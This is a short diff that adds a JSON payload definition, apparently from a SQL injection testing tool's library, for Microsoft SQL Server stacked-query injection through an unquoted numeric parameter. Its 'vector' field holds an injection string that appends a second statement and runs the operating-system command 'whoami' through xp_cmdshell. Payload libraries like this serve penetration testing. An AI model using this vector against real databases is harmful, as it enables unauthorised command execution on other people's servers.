@@ -1,0 +1,12 @@
+{
+ "dbms": "mssql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "",
+  "suffix": "",
+  "type": "numeric",
+  "desc": "numeric unquoted"
+ },
+ "vector": "{B}; EXEC xp_cmdshell('whoami')-- -",
+ "comment": "mssql stacked via numeric unquoted"
+}
